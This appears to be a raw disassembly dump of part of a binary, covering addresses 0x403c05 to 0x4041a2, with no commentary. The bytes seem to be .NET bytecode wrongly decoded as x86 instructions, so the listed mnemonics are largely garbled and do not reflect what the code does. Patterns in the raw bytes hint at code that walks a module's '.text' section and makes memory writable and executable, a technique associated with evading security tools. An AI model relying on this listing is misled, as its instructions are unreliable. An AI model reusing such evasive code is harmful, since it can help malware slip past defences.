  403c05:	7e 81                	jle    0x403b88
  403c07:	00 00                	add    %al,(%eax)
  403c09:	0a 02                	or     (%edx),%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	86 00                	xchg   %al,(%eax)
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 2b                	or     (%ebx),%ch
  403c12:	0c 7e                	or     $0x7e,%al
  403c14:	83 00 00             	addl   $0x0,(%eax)
  403c17:	0a 02                	or     (%edx),%al
  403c19:	6f                   	outsl  %ds:(%esi),(%dx)
  403c1a:	86 00                	xchg   %al,(%eax)
  403c1c:	00 0a                	add    %cl,(%edx)
  403c1e:	0a 06                	or     (%esi),%al
  403c20:	2c 09                	sub    $0x9,%al
  403c22:	06                   	push   %es
  403c23:	03 04 05 6f 87 00 00 	add    0x876f(,%eax,1),%eax
  403c2a:	0a de                	or     %dh,%bl
  403c2c:	12 26                	adc    (%esi),%ah
  403c2e:	16                   	push   %ss
  403c2f:	0b de                	or     %esi,%ebx
  403c31:	0d 06 39 06 00       	or     $0x63906,%eax
  403c36:	00 00                	add    %al,(%eax)
  403c38:	06                   	push   %es
  403c39:	6f                   	outsl  %ds:(%esi),(%dx)
  403c3a:	85 00                	test   %eax,(%eax)
  403c3c:	00 0a                	add    %cl,(%edx)
  403c3e:	dc 07                	faddl  (%edi)
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 00                	add    %al,(%eax)
  403c49:	00 04 00             	add    %al,(%eax,%eax,1)
  403c4c:	31 35 00 05 34 00    	xor    %esi,0x340500
  403c52:	00 01                	add    %al,(%ecx)
  403c54:	02 00                	add    (%eax),%al
  403c56:	04 00                	add    $0x0,%al
  403c58:	36 3a 00             	cmp    %ss:(%eax),%al
  403c5b:	0d 00 00 00 00       	or     $0x0,%eax
  403c60:	1e                   	push   %ds
  403c61:	02 28                	add    (%eax),%ch
  403c63:	14 00                	adc    $0x0,%al
  403c65:	00 0a                	add    %cl,(%edx)
  403c67:	2a 2e                	sub    (%esi),%ch
  403c69:	28 31                	sub    %dh,(%ecx)
  403c6b:	00 00                	add    %al,(%eax)
  403c6d:	0a 80 15 00 00 04    	or     0x4000015(%eax),%al
  403c73:	2a 03                	sub    (%ebx),%al
  403c75:	30 04 00             	xor    %al,(%eax,%eax,1)
  403c78:	a8 00                	test   $0x0,%al
  403c7a:	00 00                	add    %al,(%eax)
  403c7c:	00 00                	add    %al,(%eax)
  403c7e:	00 00                	add    %al,(%eax)
  403c80:	20 8d 0d 0a 98 28    	and    %cl,0x28980a0d(%ebp)
  403c86:	19 00                	sbb    %eax,(%eax)
  403c88:	00 06                	add    %al,(%esi)
  403c8a:	28 2e                	sub    %ch,(%esi)
  403c8c:	00 00                	add    %al,(%eax)
  403c8e:	06                   	push   %es
  403c8f:	28 88 00 00 0a 6f    	sub    %cl,0x6f0a0000(%eax)
  403c95:	89 00                	mov    %eax,(%eax)
  403c97:	00 0a                	add    %cl,(%edx)
  403c99:	6f                   	outsl  %ds:(%esi),(%dx)
  403c9a:	8a 00                	mov    (%eax),%al
  403c9c:	00 0a                	add    %cl,(%edx)
  403c9e:	1f                   	pop    %ds
  403c9f:	0a 2f                	or     (%edi),%ch
  403ca1:	08 28                	or     %ch,(%eax)
  403ca3:	8b 00                	mov    (%eax),%eax
  403ca5:	00 0a                	add    %cl,(%edx)
  403ca7:	1e                   	push   %ds
  403ca8:	33 0f                	xor    (%edi),%ecx
  403caa:	20 fd                	and    %bh,%ch
  403cac:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  403cb1:	00 00                	add    %al,(%eax)
  403cb3:	06                   	push   %es
  403cb4:	28 2e                	sub    %ch,(%esi)
  403cb6:	00 00                	add    %al,(%eax)
  403cb8:	06                   	push   %es
  403cb9:	20 ee                	and    %ch,%dh
  403cbb:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	06                   	push   %es
  403cc3:	20 df                	and    %bl,%bh
  403cc5:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  403cca:	00 00                	add    %al,(%eax)
  403ccc:	06                   	push   %es
  403ccd:	20 c2                	and    %al,%dl
  403ccf:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  403cd4:	00 00                	add    %al,(%eax)
  403cd6:	06                   	push   %es
  403cd7:	28 2b                	sub    %ch,(%ebx)
  403cd9:	00 00                	add    %al,(%eax)
  403cdb:	0a 20                	or     (%eax),%ah
  403cdd:	33 0d 0a 98 28 19    	xor    0x1928980a,%ecx
  403ce3:	00 00                	add    %al,(%eax)
  403ce5:	06                   	push   %es
  403ce6:	28 2b                	sub    %ch,(%ebx)
  403ce8:	00 00                	add    %al,(%eax)
  403cea:	0a 28                	or     (%eax),%ch
  403cec:	2d 00 00 06 20       	sub    $0x20060000,%eax
  403cf1:	8d 0d 0a 98 28 19    	lea    0x1928980a,%ecx
  403cf7:	00 00                	add    %al,(%eax)
  403cf9:	06                   	push   %es
  403cfa:	20 24 0d 0a 98 28 19 	and    %ah,0x1928980a(,%ecx,1)
  403d01:	00 00                	add    %al,(%eax)
  403d03:	06                   	push   %es
  403d04:	20 08                	and    %cl,(%eax)
  403d06:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  403d0b:	00 00                	add    %al,(%eax)
  403d0d:	06                   	push   %es
  403d0e:	28 2b                	sub    %ch,(%ebx)
  403d10:	00 00                	add    %al,(%eax)
  403d12:	0a 20                	or     (%eax),%ah
  403d14:	05 0d 0a 98 28       	add    $0x28980a0d,%eax
  403d19:	19 00                	sbb    %eax,(%eax)
  403d1b:	00 06                	add    %al,(%esi)
  403d1d:	28 2b                	sub    %ch,(%ebx)
  403d1f:	00 00                	add    %al,(%eax)
  403d21:	0a 28                	or     (%eax),%ch
  403d23:	2d 00 00 06 2a       	sub    $0x2a060000,%eax
  403d28:	1b 30                	sbb    (%eax),%esi
  403d2a:	04 00                	add    $0x0,%al
  403d2c:	67 00 00             	add    %al,(%bx,%si)
  403d2f:	00 15 00 00 11 7e    	add    %dl,0x7e110000
  403d35:	8c 00                	mov    %es,(%eax)
  403d37:	00 0a                	add    %cl,(%edx)
  403d39:	0a 16                	or     (%esi),%dl
  403d3b:	0b 02                	or     (%edx),%eax
  403d3d:	03 28                	add    (%eax),%ebp
  403d3f:	2f                   	das
  403d40:	00 00                	add    %al,(%eax)
  403d42:	06                   	push   %es
  403d43:	0a 06                	or     (%esi),%al
  403d45:	7e 8c                	jle    0x403cd3
  403d47:	00 00                	add    %al,(%eax)
  403d49:	0a 28                	or     (%eax),%ch
  403d4b:	8d 00                	lea    (%eax),%eax
  403d4d:	00 0a                	add    %cl,(%edx)
  403d4f:	2c 06                	sub    $0x6,%al
  403d51:	73 8e                	jae    0x403ce1
  403d53:	00 00                	add    %al,(%eax)
  403d55:	0a 7a 28             	or     0x28(%edx),%bh
  403d58:	8b 00                	mov    (%eax),%eax
  403d5a:	00 0a                	add    %cl,(%edx)
  403d5c:	1e                   	push   %ds
  403d5d:	33 04 04             	xor    (%esp,%eax,1),%eax
  403d60:	0c 2b                	or     $0x2b,%al
  403d62:	02 05 0c 06 08 8e    	add    0x8e08060c,%al
  403d68:	69 28 8f 00 00 0a    	imul   $0xa00008f,(%eax),%ebp
  403d6e:	1f                   	pop    %ds
  403d6f:	40                   	inc    %eax
  403d70:	12 01                	adc    (%ecx),%al
  403d72:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403d75:	00 06                	add    %al,(%esi)
  403d77:	26 08 16             	or     %dl,%es:(%esi)
  403d7a:	06                   	push   %es
  403d7b:	08 8e 69 28 90 00    	or     %cl,0x902869(%esi)
  403d81:	00 0a                	add    %cl,(%edx)
  403d83:	06                   	push   %es
  403d84:	08 8e 69 28 8f 00    	or     %cl,0x8f2869(%esi)
  403d8a:	00 0a                	add    %cl,(%edx)
  403d8c:	07                   	pop    %es
  403d8d:	12 01                	adc    (%ecx),%al
  403d8f:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403d92:	00 06                	add    %al,(%esi)
  403d94:	26 de 03             	fiadds %es:(%ebx)
  403d97:	26 de 00             	fiadds %es:(%eax)
  403d9a:	2a 00                	sub    (%eax),%al
  403d9c:	01 10                	add    %edx,(%eax)
  403d9e:	00 00                	add    %al,(%eax)
  403da0:	00 00                	add    %al,(%eax)
  403da2:	08 00                	or     %al,(%eax)
  403da4:	5b                   	pop    %ebx
  403da5:	63 00                	arpl   %eax,(%eax)
  403da7:	03 20                	add    (%eax),%esp
  403da9:	00 00                	add    %al,(%eax)
  403dab:	01 1b                	add    %ebx,(%ebx)
  403dad:	30 07                	xor    %al,(%edi)
  403daf:	00 ca                	add    %cl,%dl
  403db1:	02 00                	add    (%eax),%al
  403db3:	00 16                	add    %dl,(%esi)
  403db5:	00 00                	add    %al,(%eax)
  403db7:	11 16                	adc    %edx,(%esi)
  403db9:	13 0a                	adc    (%edx),%ecx
  403dbb:	7e 8c                	jle    0x403d49
  403dbd:	00 00                	add    %al,(%eax)
  403dbf:	0a 0b                	or     (%ebx),%cl
  403dc1:	7e 8c                	jle    0x403d4f
  403dc3:	00 00                	add    %al,(%eax)
  403dc5:	0a 13                	or     (%ebx),%dl
  403dc7:	06                   	push   %es
  403dc8:	7e 8c                	jle    0x403d56
  403dca:	00 00                	add    %al,(%eax)
  403dcc:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  403dcf:	8c 00                	mov    %es,(%eax)
  403dd1:	00 0a                	add    %cl,(%edx)
  403dd3:	0d 12 0b fe 15       	or     $0x15fe0b12,%eax
  403dd8:	0e                   	push   %cs
  403dd9:	00 00                	add    %al,(%eax)
  403ddb:	02 7e 8c             	add    -0x74(%esi),%bh
  403dde:	00 00                	add    %al,(%eax)
  403de0:	0a 0a                	or     (%edx),%cl
  403de2:	16                   	push   %ss
  403de3:	13 0c 7e             	adc    (%esi,%edi,2),%ecx
  403de6:	15 00 00 04 6f       	adc    $0x6f040000,%eax
  403deb:	32 00                	xor    (%eax),%al
  403ded:	00 0a                	add    %cl,(%edx)
  403def:	12 0c 28             	adc    (%eax,%ebp,1),%cl
  403df2:	3a 00                	cmp    (%eax),%al
  403df4:	00 06                	add    %al,(%esi)
  403df6:	26 20 7e 0d          	and    %bh,%es:0xd(%esi)
  403dfa:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  403e00:	06                   	push   %es
  403e01:	13 09                	adc    (%ecx),%ecx
  403e03:	11 0c 2c             	adc    %ecx,(%esp,%ebp,1)
  403e06:	14 28                	adc    $0x28,%al
  403e08:	8b 00                	mov    (%eax),%eax
  403e0a:	00 0a                	add    %cl,(%edx)
  403e0c:	1a 33                	sbb    (%ebx),%dh
  403e0e:	0c 20                	or     $0x20,%al
  403e10:	5b                   	pop    %ebx
  403e11:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  403e16:	00 00                	add    %al,(%eax)
  403e18:	06                   	push   %es
  403e19:	13 09                	adc    (%ecx),%ecx
  403e1b:	02 28                	add    (%eax),%ch
  403e1d:	30 00                	xor    %al,(%eax)
  403e1f:	00 06                	add    %al,(%esi)
  403e21:	0a 06                	or     (%esi),%al
  403e23:	7e 8c                	jle    0x403db1
  403e25:	00 00                	add    %al,(%eax)
  403e27:	0a 28                	or     (%eax),%ch
  403e29:	8d 00                	lea    (%eax),%eax
  403e2b:	00 0a                	add    %cl,(%edx)
  403e2d:	3a 4a 02             	cmp    0x2(%edx),%cl
  403e30:	00 00                	add    %al,(%eax)
  403e32:	7e 15                	jle    0x403e49
  403e34:	00 00                	add    %al,(%eax)
  403e36:	04 6f                	add    $0x6f,%al
  403e38:	32 00                	xor    (%eax),%al
  403e3a:	00 0a                	add    %cl,(%edx)
  403e3c:	06                   	push   %es
  403e3d:	12 0b                	adc    (%ebx),%cl
  403e3f:	11 0b                	adc    %ecx,(%ebx)
  403e41:	8c 0e                	mov    %cs,(%esi)
  403e43:	00 00                	add    %al,(%eax)
  403e45:	02 28                	add    (%eax),%ch
  403e47:	91                   	xchg   %eax,%ecx
  403e48:	00 00                	add    %al,(%eax)
  403e4a:	0a 28                	or     (%eax),%ch
  403e4c:	39 00                	cmp    %eax,(%eax)
  403e4e:	00 06                	add    %al,(%esi)
  403e50:	39 27                	cmp    %esp,(%edi)
  403e52:	02 00                	add    (%eax),%al
  403e54:	00 11                	add    %dl,(%ecx)
  403e56:	09 02                	or     %eax,(%edx)
  403e58:	28 2f                	sub    %ch,(%edi)
  403e5a:	00 00                	add    %al,(%eax)
  403e5c:	0a 20                	or     (%eax),%ah
  403e5e:	00 00                	add    %al,(%eax)
  403e60:	00 80 17 7e 8c 00    	add    %al,0x8c7e17(%eax)
  403e66:	00 0a                	add    %cl,(%edx)
  403e68:	19 16                	sbb    %edx,(%esi)
  403e6a:	7e 8c                	jle    0x403df8
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	0a 28                	or     (%eax),%ch
  403e70:	35 00 00 06 0d       	xor    $0xd060000,%eax
  403e75:	09 15 28 8f 00 00    	or     %edx,0x8f28
  403e7b:	0a 28                	or     (%eax),%ch
  403e7d:	8d 00                	lea    (%eax),%eax
  403e7f:	00 0a                	add    %cl,(%edx)
  403e81:	2c 0c                	sub    $0xc,%al
  403e83:	09 28                	or     %ebp,(%eax)
  403e85:	32 00                	xor    (%eax),%al
  403e87:	00 06                	add    %al,(%esi)
  403e89:	26 38 ed             	es cmp %ch,%ch
  403e8c:	01 00                	add    %eax,(%eax)
  403e8e:	00 09                	add    %cl,(%ecx)
  403e90:	7e 8c                	jle    0x403e1e
  403e92:	00 00                	add    %al,(%eax)
  403e94:	0a 20                	or     (%eax),%ah
  403e96:	02 00                	add    (%eax),%al
  403e98:	00 01                	add    %al,(%ecx)
  403e9a:	16                   	push   %ss
  403e9b:	16                   	push   %ss
  403e9c:	14 28                	adc    $0x28,%al
  403e9e:	36 00 00             	add    %al,%ss:(%eax)
  403ea1:	06                   	push   %es
  403ea2:	0c 08                	or     $0x8,%al
  403ea4:	7e 8c                	jle    0x403e32
  403ea6:	00 00                	add    %al,(%eax)
  403ea8:	0a 28                	or     (%eax),%ch
  403eaa:	8d 00                	lea    (%eax),%eax
  403eac:	00 0a                	add    %cl,(%edx)
  403eae:	2c 0c                	sub    $0xc,%al
  403eb0:	08 28                	or     %ch,(%eax)
  403eb2:	32 00                	xor    (%eax),%al
  403eb4:	00 06                	add    %al,(%esi)
  403eb6:	26 38 c0             	es cmp %al,%al
  403eb9:	01 00                	add    %eax,(%eax)
  403ebb:	00 08                	add    %cl,(%eax)
  403ebd:	1a 16                	sbb    (%esi),%dl
  403ebf:	16                   	push   %ss
  403ec0:	7e 8c                	jle    0x403e4e
  403ec2:	00 00                	add    %al,(%eax)
  403ec4:	0a 28                	or     (%eax),%ch
  403ec6:	37                   	aaa
  403ec7:	00 00                	add    %al,(%eax)
  403ec9:	06                   	push   %es
  403eca:	13 06                	adc    (%esi),%eax
  403ecc:	11 06                	adc    %eax,(%esi)
  403ece:	7e 8c                	jle    0x403e5c
  403ed0:	00 00                	add    %al,(%eax)
  403ed2:	0a 28                	or     (%eax),%ch
  403ed4:	8d 00                	lea    (%eax),%eax
  403ed6:	00 0a                	add    %cl,(%edx)
  403ed8:	3a 9f 01 00 00 11    	cmp    0x11000001(%edi),%bl
  403ede:	0b 7b 16             	or     0x16(%ebx),%edi
  403ee1:	00 00                	add    %al,(%eax)
  403ee3:	04 28                	add    $0x28,%al
  403ee5:	92                   	xchg   %eax,%edx
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	0a 1f                	or     (%edi),%bl
  403eea:	3c 6a                	cmp    $0x6a,%al
  403eec:	58                   	pop    %eax
  403eed:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403ef3:	94                   	xchg   %eax,%esp
  403ef4:	00 00                	add    %al,(%eax)
  403ef6:	0a 13                	or     (%ebx),%dl
  403ef8:	07                   	pop    %es
  403ef9:	06                   	push   %es
  403efa:	28 92 00 00 0a 11    	sub    %dl,0x110a0000(%edx)
  403f00:	07                   	pop    %es
  403f01:	6a 58                	push   $0x58
  403f03:	1c 6a                	sbb    $0x6a,%al
  403f05:	58                   	pop    %eax
  403f06:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403f0c:	95                   	xchg   %eax,%ebp
  403f0d:	00 00                	add    %al,(%eax)
  403f0f:	0a 13                	or     (%ebx),%dl
  403f11:	0d 06 11 07 1f       	or     $0x1f071106,%eax
  403f16:	14 58                	adc    $0x58,%al
  403f18:	28 96 00 00 0a 13    	sub    %dl,0x130a0000(%esi)
  403f1e:	0e                   	push   %cs
  403f1f:	16                   	push   %ss
  403f20:	13 04 38             	adc    (%eax,%edi,1),%eax
  403f23:	37                   	aaa
  403f24:	01 00                	add    %eax,(%eax)
  403f26:	00 06                	add    %al,(%esi)
  403f28:	28 92 00 00 0a 11    	sub    %dl,0x110a0000(%edx)
  403f2e:	07                   	pop    %es
  403f2f:	6a 58                	push   $0x58
  403f31:	1f                   	pop    %ds
  403f32:	18 6a 58             	sbb    %ch,0x58(%edx)
  403f35:	11 0e                	adc    %ecx,(%esi)
  403f37:	6a 58                	push   $0x58
  403f39:	11 04 1f             	adc    %eax,(%edi,%ebx,1)
  403f3c:	28 5a 6a             	sub    %bl,0x6a(%edx)
  403f3f:	58                   	pop    %eax
  403f40:	28 93 00 00 0a 0b    	sub    %dl,0xb0a0000(%ebx)
  403f46:	07                   	pop    %es
  403f47:	28 97 00 00 0a 1f    	sub    %dl,0x1f0a0000(%edi)
  403f4d:	2e 40                	cs inc %eax
  403f4f:	04 01                	add    $0x1,%al
  403f51:	00 00                	add    %al,(%eax)
  403f53:	07                   	pop    %es
  403f54:	28 92 00 00 0a 17    	sub    %dl,0x170a0000(%edx)
  403f5a:	6a 58                	push   $0x58
  403f5c:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403f62:	97                   	xchg   %eax,%edi
  403f63:	00 00                	add    %al,(%eax)
  403f65:	0a 1f                	or     (%edi),%bl
  403f67:	74 40                	je     0x403fa9
  403f69:	ea 00 00 00 07 28 92 	ljmp   $0x9228,$0x7000000
  403f70:	00 00                	add    %al,(%eax)
  403f72:	0a 18                	or     (%eax),%bl
  403f74:	6a 58                	push   $0x58
  403f76:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403f7c:	97                   	xchg   %eax,%edi
  403f7d:	00 00                	add    %al,(%eax)
  403f7f:	0a 1f                	or     (%edi),%bl
  403f81:	65 40                	gs inc %eax
  403f83:	d0 00                	rolb   $1,(%eax)
  403f85:	00 00                	add    %al,(%eax)
  403f87:	07                   	pop    %es
  403f88:	28 92 00 00 0a 19    	sub    %dl,0x190a0000(%edx)
  403f8e:	6a 58                	push   $0x58
  403f90:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403f96:	97                   	xchg   %eax,%edi
  403f97:	00 00                	add    %al,(%eax)
  403f99:	0a 1f                	or     (%edi),%bl
  403f9b:	78 40                	js     0x403fdd
  403f9d:	b6 00                	mov    $0x0,%dh
  403f9f:	00 00                	add    %al,(%eax)
  403fa1:	07                   	pop    %es
  403fa2:	28 92 00 00 0a 1a    	sub    %dl,0x1a0a0000(%edx)
  403fa8:	6a 58                	push   $0x58
  403faa:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403fb0:	97                   	xchg   %eax,%edi
  403fb1:	00 00                	add    %al,(%eax)
  403fb3:	0a 1f                	or     (%edi),%bl
  403fb5:	74 40                	je     0x403ff7
  403fb7:	9c                   	pushf
  403fb8:	00 00                	add    %al,(%eax)
  403fba:	00 07                	add    %al,(%edi)
  403fbc:	28 92 00 00 0a 1f    	sub    %dl,0x1f0a0000(%edx)
  403fc2:	0c 6a                	or     $0x6a,%al
  403fc4:	58                   	pop    %eax
  403fc5:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403fcb:	94                   	xchg   %eax,%esp
  403fcc:	00 00                	add    %al,(%eax)
  403fce:	0a 13                	or     (%ebx),%dl
  403fd0:	05 07 28 92 00       	add    $0x922807,%eax
  403fd5:	00 0a                	add    %cl,(%edx)
  403fd7:	1e                   	push   %ds
  403fd8:	6a 58                	push   $0x58
  403fda:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  403fe0:	94                   	xchg   %eax,%esp
  403fe1:	00 00                	add    %al,(%eax)
  403fe3:	0a 13                	or     (%ebx),%dl
  403fe5:	08 06                	or     %al,(%esi)
  403fe7:	28 92 00 00 0a 11    	sub    %dl,0x110a0000(%edx)
  403fed:	05 6a 58 28 93       	add    $0x9328586a,%eax
  403ff2:	00 00                	add    %al,(%eax)
  403ff4:	0a 11                	or     (%ecx),%dl
  403ff6:	08 6e 28             	or     %ch,0x28(%esi)
  403ff9:	93                   	xchg   %eax,%ebx
  403ffa:	00 00                	add    %al,(%eax)
  403ffc:	0a 1f                	or     (%edi),%bl
  403ffe:	40                   	inc    %eax
  403fff:	12 0a                	adc    (%edx),%cl
  404001:	28 34 00             	sub    %dh,(%eax,%eax,1)
  404004:	00 06                	add    %al,(%esi)
  404006:	26 06                	es push %es
  404008:	28 92 00 00 0a 11    	sub    %dl,0x110a0000(%edx)
  40400e:	05 6a 58 28 93       	add    $0x9328586a,%eax
  404013:	00 00                	add    %al,(%eax)
  404015:	0a 11                	or     (%ecx),%dl
  404017:	06                   	push   %es
  404018:	28 92 00 00 0a 11    	sub    %dl,0x110a0000(%edx)
  40401e:	05 6a 58 28 93       	add    $0x9328586a,%eax
  404023:	00 00                	add    %al,(%eax)
  404025:	0a 11                	or     (%ecx),%dl
  404027:	08 6e 28             	or     %ch,0x28(%esi)
  40402a:	93                   	xchg   %eax,%ebx
  40402b:	00 00                	add    %al,(%eax)
  40402d:	0a 28                	or     (%eax),%ch
  40402f:	38 00                	cmp    %al,(%eax)
  404031:	00 06                	add    %al,(%esi)
  404033:	26 06                	es push %es
  404035:	28 92 00 00 0a 11    	sub    %dl,0x110a0000(%edx)
  40403b:	05 6a 58 28 93       	add    $0x9328586a,%eax
  404040:	00 00                	add    %al,(%eax)
  404042:	0a 11                	or     (%ecx),%dl
  404044:	08 6e 28             	or     %ch,0x28(%esi)
  404047:	93                   	xchg   %eax,%ebx
  404048:	00 00                	add    %al,(%eax)
  40404a:	0a 11                	or     (%ecx),%dl
  40404c:	0a 12                	or     (%edx),%dl
  40404e:	0a 28                	or     (%eax),%ch
  404050:	34 00                	xor    $0x0,%al
  404052:	00 06                	add    %al,(%esi)
  404054:	26 2b 10             	sub    %es:(%eax),%edx
  404057:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40405a:	58                   	pop    %eax
  40405b:	68 13 04 11 04       	push   $0x4110413
  404060:	11 0d 3f c0 fe ff    	adc    %ecx,0xfffec03f
  404066:	ff 08                	decl   (%eax)
  404068:	28 32                	sub    %dh,(%edx)
  40406a:	00 00                	add    %al,(%eax)
  40406c:	06                   	push   %es
  40406d:	26 09 28             	or     %ebp,%es:(%eax)
  404070:	32 00                	xor    (%eax),%al
  404072:	00 06                	add    %al,(%esi)
  404074:	26 06                	es push %es
  404076:	28 33                	sub    %dh,(%ebx)
  404078:	00 00                	add    %al,(%eax)
  40407a:	06                   	push   %es
  40407b:	26 de 03             	fiadds %es:(%ebx)
  40407e:	26 de 00             	fiadds %es:(%eax)
  404081:	2a 00                	sub    (%eax),%al
  404083:	00 41 1c             	add    %al,0x1c(%ecx)
  404086:	00 00                	add    %al,(%eax)
  404088:	00 00                	add    %al,(%eax)
  40408a:	00 00                	add    %al,(%eax)
  40408c:	2d 00 00 00 99       	sub    $0x99000000,%eax
  404091:	02 00                	add    (%eax),%al
  404093:	00 c6                	add    %al,%dh
  404095:	02 00                	add    (%eax),%al
  404097:	00 03                	add    %al,(%ebx)
  404099:	00 00                	add    %al,(%eax)
  40409b:	00 20                	add    %ah,(%eax)
  40409d:	00 00                	add    %al,(%eax)
  40409f:	01 36                	add    %esi,(%esi)
  4040a1:	02 28                	add    (%eax),%ch
  4040a3:	30 00                	xor    %al,(%eax)
  4040a5:	00 06                	add    %al,(%esi)
  4040a7:	03 28                	add    (%eax),%ebp
  4040a9:	31 00                	xor    %eax,(%eax)
  4040ab:	00 06                	add    %al,(%esi)
  4040ad:	2a 00                	sub    (%eax),%al
  4040af:	00 1b                	add    %bl,(%ebx)
  4040b1:	30 02                	xor    %al,(%edx)
  4040b3:	00 68 00             	add    %ch,0x0(%eax)
  4040b6:	00 00                	add    %al,(%eax)
  4040b8:	17                   	pop    %ss
  4040b9:	00 00                	add    %al,(%eax)
  4040bb:	11 7e 8c             	adc    %edi,-0x74(%esi)
  4040be:	00 00                	add    %al,(%eax)
  4040c0:	0a 26                	or     (%esi),%ah
  4040c2:	7e 15                	jle    0x4040d9
  4040c4:	00 00                	add    %al,(%eax)
  4040c6:	04 6f                	add    $0x6f,%al
  4040c8:	98                   	cwtl
  4040c9:	00 00                	add    %al,(%eax)
  4040cb:	0a 6f 99             	or     -0x67(%edi),%ch
  4040ce:	00 00                	add    %al,(%eax)
  4040d0:	0a 0a                	or     (%edx),%cl
  4040d2:	2b 2d 06 6f 9a 00    	sub    0x9a6f06,%ebp
  4040d8:	00 0a                	add    %cl,(%edx)
  4040da:	74 18                	je     0x4040f4
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	01 0b                	add    %ecx,(%ebx)
  4040e0:	07                   	pop    %es
  4040e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e2:	9b                   	fwait
  4040e3:	00 00                	add    %al,(%eax)
  4040e5:	0a 6f 9c             	or     -0x64(%edi),%ch
  4040e8:	00 00                	add    %al,(%eax)
  4040ea:	0a 02                	or     (%edx),%al
  4040ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ed:	9c                   	pushf
  4040ee:	00 00                	add    %al,(%eax)
  4040f0:	0a 6f 9d             	or     -0x63(%edi),%ch
  4040f3:	00 00                	add    %al,(%eax)
  4040f5:	0a 2c 09             	or     (%ecx,%ecx,1),%ch
  4040f8:	07                   	pop    %es
  4040f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4040fa:	9e                   	sahf
  4040fb:	00 00                	add    %al,(%eax)
  4040fd:	0a 0c de             	or     (%esi,%ebx,8),%cl
  404100:	21 06                	and    %eax,(%esi)
  404102:	6f                   	outsl  %ds:(%esi),(%dx)
  404103:	9f                   	lahf
  404104:	00 00                	add    %al,(%eax)
  404106:	0a 2d cb de 11 06    	or     0x611decb,%ch
  40410c:	75 22                	jne    0x404130
  40410e:	00 00                	add    %al,(%eax)
  404110:	01 0d 09 2c 06 09    	add    %ecx,0x9062c09
  404116:	6f                   	outsl  %ds:(%esi),(%dx)
  404117:	21 00                	and    %eax,(%eax)
  404119:	00 0a                	add    %cl,(%edx)
  40411b:	dc 7e 8c             	fdivrl -0x74(%esi)
  40411e:	00 00                	add    %al,(%eax)
  404120:	0a 2a                	or     (%edx),%ch
  404122:	08 2a                	or     %ch,(%edx)
  404124:	01 10                	add    %edx,(%eax)
  404126:	00 00                	add    %al,(%eax)
  404128:	02 00                	add    (%eax),%al
  40412a:	16                   	push   %ss
  40412b:	00 39                	add    %bh,(%ecx)
  40412d:	4f                   	dec    %edi
  40412e:	00 11                	add    %dl,(%ecx)
  404130:	00 00                	add    %al,(%eax)
  404132:	00 00                	add    %al,(%eax)
  404134:	1b 30                	sbb    (%eax),%esi
  404136:	04 00                	add    $0x0,%al
  404138:	cf                   	iret
  404139:	01 00                	add    %eax,(%eax)
  40413b:	00 18                	add    %bl,(%eax)
  40413d:	00 00                	add    %al,(%eax)
  40413f:	11 7e 8c             	adc    %edi,-0x74(%esi)
  404142:	00 00                	add    %al,(%eax)
  404144:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  404147:	8c 00                	mov    %es,(%eax)
  404149:	00 0a                	add    %cl,(%edx)
  40414b:	0c 0f                	or     $0xf,%al
  40414d:	00 28                	add    %ch,(%eax)
  40414f:	a0 00 00 0a 1f       	mov    0x1f0a0000,%al
  404154:	3c 6a                	cmp    $0x6a,%al
  404156:	58                   	pop    %eax
  404157:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  40415d:	94                   	xchg   %eax,%esp
  40415e:	00 00                	add    %al,(%eax)
  404160:	0a 13                	or     (%ebx),%dl
  404162:	04 0f                	add    $0xf,%al
  404164:	00 28                	add    %ch,(%eax)
  404166:	a0 00 00 0a 11       	mov    0x110a0000,%al
  40416b:	04 6a                	add    $0x6a,%al
  40416d:	58                   	pop    %eax
  40416e:	1f                   	pop    %ds
  40416f:	14 6a                	adc    $0x6a,%al
  404171:	58                   	pop    %eax
  404172:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  404178:	95                   	xchg   %eax,%ebp
  404179:	00 00                	add    %al,(%eax)
  40417b:	0a 26                	or     (%esi),%ah
  40417d:	0f 00 28             	verw   (%eax)
  404180:	a0 00 00 0a 11       	mov    0x110a0000,%al
  404185:	04 6a                	add    $0x6a,%al
  404187:	58                   	pop    %eax
  404188:	1f                   	pop    %ds
  404189:	18 6a 58             	sbb    %ch,0x58(%edx)
  40418c:	0d 09 28 93 00       	or     $0x932809,%eax
  404191:	00 0a                	add    %cl,(%edx)
  404193:	28 95 00 00 0a 20    	sub    %dl,0x200a0000(%ebp)
  404199:	0b 01                	or     (%ecx),%eax
  40419b:	00 00                	add    %al,(%eax)
  40419d:	33 09                	xor    (%ecx),%ecx
  40419f:	09 1f                	or     %ebx,(%edi)
  4041a1:	60                   	pusha
  4041a2:	6a 58                	push   $0x58
